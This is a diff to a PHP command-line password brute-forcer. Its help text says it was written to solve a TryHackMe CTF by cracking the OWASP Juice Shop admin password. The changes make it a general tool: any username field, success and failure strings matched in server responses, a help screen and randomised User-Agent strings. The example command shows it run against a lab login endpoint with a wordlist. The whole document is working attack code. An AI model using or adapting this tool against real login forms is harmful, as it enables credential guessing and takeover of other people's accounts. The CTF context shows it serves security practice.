@@ -2,15 +2,48 @@
 
 $local_args = [
     "--wordlist" => false,
+    "--username_field" => "email",
     "--url" => false,
     "--json" => false,
-    "--email" => false,
-    "--v" => false
+    "--username" => false,
+    "--v" => false,
+    "--lookfor" => "",
+    "--not_lookfor" => "",
 ];
+
+$local_args_help = [    
+    "Disclaimer: " => "Use this script wisely and be a gentleman/woman.",
+    
+    "Written by: " => "Babak Bandpey babak.bandpey@gmail.com as a solution finder for a TryHackMe CTF in OWASP Juice Shop bruteforce the admin password.",
+    
+    "--wordlist" => "The wordlist containing the words you like to try as password. Usually located in /usr/share/wordlists/",
+    
+    "--username_field" => "The name of the username field. Could be email or username or whatever the form contains",
+    
+    "--url" => "The URL which the form is post to.",
+    
+    "--json" => "Set to true if you like to send the request in JSON format.",
+    
+    "--username" => "The value of the username_field. if email then an email-address or just a username.",
+    
+    "--v" => "Try verbose mode.",
+    
+    "--lookfor" => "What 'to look for' to assert that the password logged in.",
+    
+    "--not_lookfor" => "What 'not to look for' to assert that the password logged in.",    
+    
+];
+
 
 if(count($argv) > 1) {
     for($i = 1; $i < count($argv); $i++){
         $tmp = explode("=", $argv[$i]);
+
+        if($tmp[0] == "--help") {
+            show_help($local_args_help);
+            exit;
+        }
+
         if(array_key_exists($tmp[0], $local_args)) {
             $local_args[$tmp[0]] = $tmp[1];
         }        
@@ -20,10 +53,9 @@ if(count($argv) > 1) {
 if(
     !$local_args["--wordlist"] ||
     !$local_args["--url"] ||
-    !$local_args["--email"]
+    !$local_args["--username"]
     ){
-        echo "You need to provide the --wordlist, --url and --email as minumum.\n";
-        echo "Example: passwd_brute.php --wordlist=/usr/share/seclists/Passwords/Common-Credentials/best1050.txt --json=true --url=http://10.10.32.195/rest/user/login --email=admin@juice-sh.op --v=true\n";
+        show_help($local_args_help);
         exit;
     }
 
@@ -42,9 +74,24 @@ try{
                 echo ++$c . " - Trying: " . $psswd . "\n";
             }
 
-            if( $result = post_request($local_args["--url"], ["email"=>$local_args["--email"],"password"=>$psswd], $local_args["--json"] )) {
-                echo $result;
-                break;
+            if( $result = post_request($local_args["--url"], [$local_args['--username_field']=>$local_args["--username"],"password"=>$psswd], $local_args["--json"] )) {
+
+                if($local_args['--v']) {
+                    echo $result . "\n";
+                }
+
+
+                if( 
+                    ($local_args["--lookfor"] && strpos($result, $local_args["--lookfor"])) || 
+                    ($local_args["--not_lookfor"] && !strpos($result, $local_args["--not_lookfor"]))
+                ) {                    
+                    $str = "**** Password: {$psswd} ****";
+                    echo str_repeat("*", strlen($str)) . PHP_EOL;
+                    echo $str . PHP_EOL;
+                    echo str_repeat("*", strlen($str)) . PHP_EOL;                    
+                    break;
+                }
+
             }          
         }
         fclose($file);
@@ -87,7 +134,7 @@ function post_request($url, array $params, $json_encode = false) {
                 'Accept-Language: en-US,en;q=0.5',
                 'Accept-Encoding: gzip, deflate',
                 'Accept: application/json, text/plain, */*',
-                'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
+                'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:' . rand(10, 100) . '.0) Gecko/20100101 Firefox/' . rand(10, 100). '.0',
                 'Content-Length: ' . strlen($content),
                 'Origin: ' . $parsed_url['host'],
                 'Cookie: io=5NClLy2aB1zEuoKgAAAd; language=en; continueCode=Pwma6XxDOa3kY5bEJRzoqLnyBWpd9qiQdKeMNmr8P1lv4w9VjZ2g7Q6g4Rzx',
@@ -107,10 +154,21 @@ function post_request($url, array $params, $json_encode = false) {
     );
 
     if ($fp) {        
-        $result = "\n\n ******* THE PASSWORD IS: " . $params['password'] . " ******* \n" . stream_get_contents($fp); // no maxlength/offset
+        $result = stream_get_contents($fp); // no maxlength/offset
         fclose($fp);
         return $result;
     }    
 
     return false;
+}
+
+
+function show_help($local_args) {
+    foreach($local_args as $key => $help) {
+        echo " ----- " . PHP_EOL;
+        echo " * " . $key . " => ". $help . PHP_EOL;
+    }
+    echo " ----- " . PHP_EOL;
+    echo "You need to provide the --wordlist, --url and --email as minumum." . PHP_EOL . PHP_EOL;
+    echo "Example: passwd_brute.php --wordlist=/usr/share/seclists/Passwords/Common-Credentials/best1050.txt --json=true --url=http://10.10.32.195/rest/user/login --username=admin@juice-sh.op --v=true --not_lookfor=\"Please provide a valid username and password\"" . PHP_EOL . PHP_EOL;
 }
